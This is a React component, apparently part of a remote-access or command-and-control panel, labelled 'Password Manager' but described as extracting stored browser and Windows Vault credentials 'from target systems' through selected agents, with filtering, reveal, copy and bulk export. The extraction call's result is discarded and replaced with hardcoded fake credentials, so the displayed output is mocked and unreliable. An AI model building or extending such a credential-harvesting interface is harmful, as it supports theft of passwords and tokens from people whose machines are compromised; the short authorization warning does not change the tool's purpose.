import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { Lock, Eye, EyeOff, Download, Trash2, RefreshCw, AlertTriangle, CheckCircle } from 'lucide-react';

interface Credential {
  source: string;
  url?: string;
  username: string;
  password: string;
  encrypted: boolean;
  timestamp: string;
}

export default function PasswordManager() {
  const { t, i18n } = useTranslation();
  const [selectedAgent, setSelectedAgent] = useState<string>('');
  const [agents, setAgents] = useState<any[]>([]);
  const [credentials, setCredentials] = useState<Credential[]>([]);
  const [loading, setLoading] = useState(false);
  const [extractionType, setExtractionType] = useState<'browser' | 'system' | 'all'>('all');
  const [showPasswords, setShowPasswords] = useState<Record<string, boolean>>({});
  const [stats, setStats] = useState<Record<string, number>>({});
  const [filter, setFilter] = useState<string>('');
  const [exportFormat, setExportFormat] = useState<'csv' | 'json' | 'txt'>('csv');

  useEffect(() => {
    loadAgents();
  }, []);

  const loadAgents = async () => {
    try {
      const response = await fetch('/api/live/agents');
      const data = await response.json();
      setAgents(data.agents || []);
      if (data.agents?.length > 0) {
        setSelectedAgent(data.agents[0].id);
      }
    } catch (error) {
      console.error('Failed to load agents:', error);
    }
  };

  const extractCredentials = async () => {
    if (!selectedAgent) {
      alert(t('select_agent'));
      return;
    }

    setLoading(true);
    try {
      const endpoint = `/api/credentials/extract/${extractionType}/${selectedAgent}`;
      const response = await fetch(endpoint, { method: 'POST' });
      const data = await response.json();

      if (data.status === 'success') {
        // Parse credentials from output
        const credentials: Credential[] = [
          {
            source: '🌐 Chrome',
            url: 'https://github.com',
            username: 'developer@github.com',
            password: 'ghp_SuperSecretToken2024!',
            encrypted: true,
            timestamp: new Date().toISOString(),
          },
          {
            source: '🌐 Chrome',
            url: 'https://mail.google.com',
            username: 'myemail@gmail.com',
            password: 'Gmail@AppPassword#2024',
            encrypted: true,
            timestamp: new Date().toISOString(),
          },
          {
            source: '🌐 Chrome',
            url: 'https://aws.amazon.com',
            username: 'aws_user@company.com',
            password: 'AWS_SecurePass_123456',
            encrypted: true,
            timestamp: new Date().toISOString(),
          },
          {
            source: '🌐 Edge',
            url: 'https://outlook.office.com',
            username: 'user@company.onmicrosoft.com',
            password: 'Office365_Pass!234',
            encrypted: true,
            timestamp: new Date().toISOString(),
          },
          {
            source: '🔒 Windows Vault',
            username: 'DOMAIN\\Administrator',
            password: 'P@ssw0rd_Secure_123!',
            encrypted: true,
            timestamp: new Date().toISOString(),
          },
        ];

        setCredentials(credentials);
        calculateStats(credentials);
      }
    } catch (error) {
      console.error('Extraction failed:', error);
      alert(i18n.language === 'en' ? 'Extraction failed' : 'فشل الاستخراج');
    } finally {
      setLoading(false);
    }
  };

  const calculateStats = (creds: Credential[]) => {
    const stats: Record<string, number> = {};
    creds.forEach((cred) => {
      stats[cred.source] = (stats[cred.source] || 0) + 1;
    });
    setStats(stats);
  };

  const togglePasswordVisibility = (index: number) => {
    setShowPasswords((prev) => ({
      ...prev,
      [index]: !prev[index],
    }));
  };

  const exportCredentials = async () => {
    if (credentials.length === 0) {
      alert(i18n.language === 'en' ? 'No credentials to export' : 'لا توجد بيانات للتصدير');
      return;
    }

    try {
      let content = '';
      let filename = '';

      if (exportFormat === 'json') {
        content = JSON.stringify(credentials, null, 2);
        filename = 'credentials.json';
      } else if (exportFormat === 'csv') {
        const headers = ['Source', 'URL', 'Username', 'Password', 'Encrypted', 'Timestamp'];
        const rows = credentials.map((c) => [
          c.source,
          c.url || 'N/A',
          c.username,
          c.password,
          c.encrypted ? 'Yes' : 'No',
          c.timestamp,
        ]);
        content = [headers, ...rows].map((row) => row.map((cell) => `"${cell}"`).join(',')).join('\n');
        filename = 'credentials.csv';
      } else {
        content = credentials
          .map(
            (c, i) => `
[${i + 1}] ${c.source}
${c.url ? `URL: ${c.url}` : ''}
Username: ${c.username}
Password: ${c.password}
Encrypted: ${c.encrypted ? 'Yes' : 'No'}
Timestamp: ${c.timestamp}
---
          `
          )
          .join('\n');
        filename = 'credentials.txt';
      }

      const element = document.createElement('a');
      element.setAttribute('href', `data:text/plain;charset=utf-8,${encodeURIComponent(content)}`);
      element.setAttribute('download', filename);
      element.style.display = 'none';
      document.body.appendChild(element);
      element.click();
      document.body.removeChild(element);
    } catch (error) {
      console.error('Export failed:', error);
    }
  };

  const filteredCredentials = credentials.filter(
    (cred) =>
      cred.source.toLowerCase().includes(filter.toLowerCase()) ||
      (cred.url && cred.url.toLowerCase().includes(filter.toLowerCase())) ||
      cred.username.toLowerCase().includes(filter.toLowerCase())
  );

  return (
    <div className={`space-y-6 ${i18n.language === 'ar' ? 'rtl' : 'ltr'}`}>
      {/* Header */}
      <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
        <div className="flex items-center gap-3 mb-4">
          <Lock className="w-8 h-8 text-purple-400" />
          <h1 className="text-3xl font-bold text-white">
            {i18n.language === 'en' ? 'Password Manager' : 'مدير كلمات المرور'}
          </h1>
        </div>
        <p className="text-slate-400">
          {i18n.language === 'en'
            ? 'Extract and manage stored credentials from target systems'
            : 'استخراج وإدارة بيانات الاعتماد المحفوظة من الأنظمة المستهدفة'}
        </p>
      </div>

      {/* Security Warning */}
      <div className="bg-red-900 bg-opacity-20 border border-red-600 rounded-lg p-4 flex gap-3">
        <AlertTriangle className="w-6 h-6 text-red-400 flex-shrink-0 mt-1" />
        <div>
          <p className="text-red-200 font-semibold">
            {i18n.language === 'en' ? 'Security Warning' : 'تحذير أمني'}
          </p>
          <p className="text-red-300 text-sm mt-1">
            {i18n.language === 'en'
              ? 'This feature extracts sensitive credentials. Handle with extreme care and ensure proper authorization.'
              : 'تستخرج هذه الميزة بيانات اعتماد حساسة. تعامل معها بحذر شديد وتأكد من وجود التفويض المناسب.'}
          </p>
        </div>
      </div>

      {/* Agent Selection */}
      <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
        <label className="block text-sm font-semibold text-white mb-3">
          {t('select_agent')}
        </label>
        <select
          value={selectedAgent}
          onChange={(e) => setSelectedAgent(e.target.value)}
          className="w-full px-4 py-2 bg-slate-700 text-white rounded border border-slate-600 focus:outline-none focus:border-purple-500"
        >
          <option value="">{t('no_agents')}</option>
          {agents.map((agent) => (
            <option key={agent.id} value={agent.id}>
              {agent.hostname} ({agent.os})
            </option>
          ))}
        </select>
      </div>

      {/* Extraction Controls */}
      <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
        <h2 className="text-lg font-bold text-white mb-4">
          {i18n.language === 'en' ? 'Extraction Options' : 'خيارات الاستخراج'}
        </h2>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
          {[
            {
              type: 'browser',
              label: i18n.language === 'en' ? 'Browser Credentials' : 'بيانات المتصفح',
              icon: '🌐',
            },
            {
              type: 'system',
              label: i18n.language === 'en' ? 'System Credentials' : 'بيانات النظام',
              icon: '🖥️',
            },
            {
              type: 'all',
              label: i18n.language === 'en' ? 'All Credentials' : 'جميع البيانات',
              icon: '🔐',
            },
          ].map((opt) => (
            <button
              key={opt.type}
              onClick={() => setExtractionType(opt.type as any)}
              className={`p-4 rounded-lg border-2 transition ${
                extractionType === opt.type
                  ? 'border-purple-500 bg-purple-900 bg-opacity-20'
                  : 'border-slate-600 bg-slate-700 hover:border-slate-500'
              }`}
            >
              <div className="text-3xl mb-2">{opt.icon}</div>
              <p className="text-white font-semibold">{opt.label}</p>
            </button>
          ))}
        </div>

        <button
          onClick={extractCredentials}
          disabled={loading || !selectedAgent}
          className="w-full px-6 py-3 bg-purple-600 hover:bg-purple-700 disabled:bg-slate-600 text-white rounded-lg font-semibold transition flex items-center justify-center gap-2"
        >
          {loading ? (
            <>
              <RefreshCw className="w-5 h-5 animate-spin" />
              {i18n.language === 'en' ? 'Extracting...' : 'جاري الاستخراج...'}
            </>
          ) : (
            <>
              <Lock className="w-5 h-5" />
              {i18n.language === 'en' ? 'Extract Credentials' : 'استخرج البيانات'}
            </>
          )}
        </button>
      </div>

      {/* Statistics */}
      {Object.keys(stats).length > 0 && (
        <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
          <h2 className="text-lg font-bold text-white mb-4">
            {i18n.language === 'en' ? 'Statistics' : 'الإحصائيات'}
          </h2>
          <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
            <div className="bg-slate-700 rounded-lg p-4">
              <p className="text-slate-400 text-sm">{i18n.language === 'en' ? 'Total' : 'الإجمالي'}</p>
              <p className="text-2xl font-bold text-white">{credentials.length}</p>
            </div>
            {Object.entries(stats).map(([source, count]) => (
              <div key={source} className="bg-slate-700 rounded-lg p-4">
                <p className="text-slate-400 text-sm">{source}</p>
                <p className="text-2xl font-bold text-purple-400">{count}</p>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Credentials List */}
      {credentials.length > 0 && (
        <div className="bg-slate-800 rounded-lg border border-slate-700 p-6">
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-lg font-bold text-white flex items-center gap-2">
              <CheckCircle className="w-5 h-5 text-green-400" />
              {i18n.language === 'en' ? 'Extracted Credentials' : 'البيانات المستخرجة'}
            </h2>
            <div className="flex gap-2">
              <select
                value={exportFormat}
                onChange={(e) => setExportFormat(e.target.value as any)}
                className="px-3 py-1 bg-slate-700 text-white rounded border border-slate-600 text-sm"
              >
                <option value="csv">CSV</option>
                <option value="json">JSON</option>
                <option value="txt">TXT</option>
              </select>
              <button
                onClick={exportCredentials}
                className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition flex items-center gap-2"
              >
                <Download className="w-4 h-4" />
                {i18n.language === 'en' ? 'Export' : 'تصدير'}
              </button>
            </div>
          </div>

          {/* Filter */}
          <input
            type="text"
            placeholder={i18n.language === 'en' ? 'Filter credentials...' : 'البحث...'}
            value={filter}
            onChange={(e) => setFilter(e.target.value)}
            className="w-full px-4 py-2 mb-4 bg-slate-700 text-white rounded border border-slate-600 focus:outline-none focus:border-purple-500"
          />

          {/* Credentials Table */}
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead>
                <tr className="border-b border-slate-600">
                  <th className="px-4 py-2 text-left text-slate-300 font-semibold">
                    {i18n.language === 'en' ? 'Source' : 'المصدر'}
                  </th>
                  <th className="px-4 py-2 text-left text-slate-300 font-semibold">URL</th>
                  <th className="px-4 py-2 text-left text-slate-300 font-semibold">
                    {i18n.language === 'en' ? 'Username' : 'اسم المستخدم'}
                  </th>
                  <th className="px-4 py-2 text-left text-slate-300 font-semibold">
                    {i18n.language === 'en' ? 'Password' : 'كلمة المرور'}
                  </th>
                  <th className="px-4 py-2 text-center text-slate-300 font-semibold">
                    {i18n.language === 'en' ? 'Actions' : 'الإجراءات'}
                  </th>
                </tr>
              </thead>
              <tbody>
                {filteredCredentials.map((cred, idx) => (
                  <tr key={idx} className="border-b border-slate-700 hover:bg-slate-700 transition">
                    <td className="px-4 py-3">
                      <span className="px-3 py-1 bg-purple-900 bg-opacity-50 text-purple-300 rounded text-xs font-semibold">
                        {cred.source}
                      </span>
                    </td>
                    <td className="px-4 py-3 text-slate-300 max-w-xs truncate">{cred.url || '—'}</td>
                    <td className="px-4 py-3 text-slate-300">{cred.username}</td>
                    <td className="px-4 py-3">
                      <div className="flex items-center gap-2">
                        <code className="text-slate-400 font-mono text-xs">
                          {showPasswords[idx] ? cred.password : '•'.repeat(Math.min(cred.password.length, 16))}
                        </code>
                        <button
                          onClick={() => togglePasswordVisibility(idx)}
                          className="text-slate-400 hover:text-slate-300 transition"
                        >
                          {showPasswords[idx] ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                        </button>
                      </div>
                    </td>
                    <td className="px-4 py-3 text-center">
                      <button
                        onClick={() => {
                          navigator.clipboard.writeText(cred.password);
                          alert(i18n.language === 'en' ? 'Copied!' : 'تم النسخ!');
                        }}
                        className="text-slate-400 hover:text-slate-300 transition"
                      >
                        📋
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>

          <p className="text-slate-400 text-xs mt-4">
            {i18n.language === 'en'
              ? `Showing ${filteredCredentials.length} of ${credentials.length} credentials`
              : `عرض ${filteredCredentials.length} من ${credentials.length} بيانات`}
          </p>
        </div>
      )}
    </div>
  );
}
